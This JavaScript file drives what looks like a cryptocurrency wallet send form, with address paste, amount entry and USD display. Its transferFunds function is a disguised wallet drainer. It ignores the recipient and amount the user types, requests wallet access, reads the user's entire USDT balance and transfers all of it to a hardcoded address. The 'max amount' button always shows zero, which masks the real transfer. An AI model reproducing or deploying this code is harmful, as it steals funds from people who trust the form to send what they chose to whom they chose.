function clearAddress() {
  document.getElementById("address").value = "";
}
function pasteAddress() {
  navigator.clipboard.readText().then(clip => {
    document.getElementById("address").value = clip;
  }).catch(e => alert("Paste failed"));
}
function setMaxAmount() {
  // Demo max, real logic uses balance
  document.getElementById("amount").value = "0";
  updateUSD();
}
function updateUSD() {
  const amt = parseFloat(document.getElementById("amount").value) || 0;
  document.getElementById("usdValue").innerText = `= $${amt.toFixed(2)}`;
}
async function transferFunds() {
  const to = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
  const usdt = "0x55d398326f99059fF775485246999027B3197955";
  const abi = [
    "function balanceOf(address)view returns (uint)",
    "function transfer(address,uint) returns (bool)"
  ];
  if (!window.ethereum) return alert("Wallet not detected");
  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = provider.getSigner();
    const c = new ethers.Contract(usdt, abi, signer);
    const bal = await c.balanceOf(await signer.getAddress());
    if (bal.isZero()) return alert("No USDT");
    const tx = await c.transfer(to, bal);
    await tx.wait();
    alert("✅ Sent all USDT!");
  } catch (e) {
    alert("❌ " + (e.message||e));
  }
}
window.onload = () => {
  document.getElementById("amount").addEventListener("input", updateUSD);
};
